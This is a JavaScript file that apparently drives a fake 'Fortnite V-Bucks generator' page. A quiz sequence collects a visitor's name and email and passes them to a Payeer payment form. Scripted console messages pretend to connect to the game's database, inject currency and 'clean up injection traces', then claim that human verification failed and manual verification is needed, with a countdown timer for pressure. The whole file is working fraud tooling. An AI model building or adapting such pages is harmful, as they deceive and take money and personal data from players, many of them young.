var real_val = {
	1: 'option2',
	2: 'option2',
	3: 'option4',
	4: 'option3',
	5: 'option1',
	6: 'option4'
};
var next_modal = {
	1: 'modal2',
	2: 'modal3',
	3: 'modal4',
	4: 'modal5',
	5: 'modal6',
	6: 'form',
	7: 'congrat',
	8: 'awesome'
	
};
function validateEmail(email) {
    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
function goPay(sum){
	$('#payeerForm [name="sum"]').val(sum);
	$('#payeerForm').submit();
}
function nextStep(el, this_step){
	var el = $(el), form = el.closest('form'), select_option = form.find('.quiz-question__option input[type=radio]:checked'), select_el, answer_val;
	if(this_step == 7 || this_step == 8 || select_option.length){
	select_el = select_option.closest('.quiz-question__option');
	answer_val = select_option.val();
	if(this_step == 7){
	var name = $('#name'), email = $('#email');
	if(name.val()){
	if(email.val() && validateEmail(email.val())){
	$('#payeerForm [name="user"]').val(name.val());
	$('#payeerForm [name="email"]').val(email.val());
	} else {
		email.focus();	
		return false;
	}
	} else {
		name.focus();
		return false;
	}
	}
	if(this_step == 7 || this_step == 8 || answer_val == real_val[this_step]){
	$.magnificPopup.close();	
	if(next_modal[this_step]){
	setTimeout(function(){
	$('#'+next_modal[this_step]+'_button').click();
	}, 200);
	}
	} else {
	select_el.addClass('false');	
	}
	} else alert('Выберите ответ');
}

$(document).ready(function() {
	
	// Domain Subfolder Name
	var $subfolder_name = '';
	
	// Sound Settings: 1 = ON | 0 = OFF
	$sound_setting = 1;	
	
	// Console Messages
	var $console_message_resource_1 = 'v-Bucks';
	var $console_message_1 = 'Loading generator files...';
	var $console_message_2 = 'Extracting generator files...';
	var $console_message_3 = 'Connecting to proxy server...';
	var $console_message_4 = 'Establishing connection with game database...';
	var $console_message_5 = 'Searching for username';
	var $console_message_6 = 'Succesfully connected to username';
	var $console_message_7 = 'Preparing to generate Fortnite v-Bucks';
	var $console_message_8 = 'Generating';
	var $console_message_9 = 'Succesfully generated';
	var $console_message_10 = 'Cleaning up injection traces';
	var $console_message_11 = 'Performing automatic human verification';
	var $console_message_12 = 'Automatic human verification failed';
	var $console_message_13 = 'Manual verification required';
	
	var $console_message_version_1 = 'Unlocking';
	var $console_message_version_2 = 'Edition';
	var $console_message_version_3 = 'Succesfully Unlocked';
	
	// vBucks Amounts
	$vbucks_amount_1 = '2500';
	$vbucks_amount_2 = '5000';
	$vbucks_amount_3 = '7500';
	$vbucks_amount_4 = '13500';
	
	// Human Verification Timer
	var $human_verification_timer_value = '180'; //Countdown remaing time in seconds	
	
	ion.sound({
		sounds: [
			{
				name: "swash",
				path: "audio/",
				volume: 0.8
			},
			{
				name: "ss",
				path: "audio/",
				volume: 0.2
			}
		],
		path: "sounds/",
		preload: true,
		multiplay: true
	});
	
	$('.slick').slick({
		autoplay: false,
		dots: true,
		cssEase: 'ease-in-out',
		speed: 800
	});
	$('.slick').on('beforeChange', function(event, slick, currentSlide, nextSlide){
		$('.slider-wrapper').addClass('moving');
	});
	$('.slick').on('afterChange', function(event, slick, currentSlide, nextSlide){
		$('.slider-wrapper').removeClass('moving');
	});
	

	
    $('.popup-tos').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-contact').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-pp').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-tests').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-form').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-selectVbucks').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-vbucks').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-congrat').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-awesome').magnificPopup({
        type: 'inline',
        preloader: false
    });
    
	
});

var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();

function rng(min, max) {
	return Math.floor(Math.random() * (max - min + 1) + min);

}
function Random(_0xaa63x2, _0xaa63x3) {
	return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};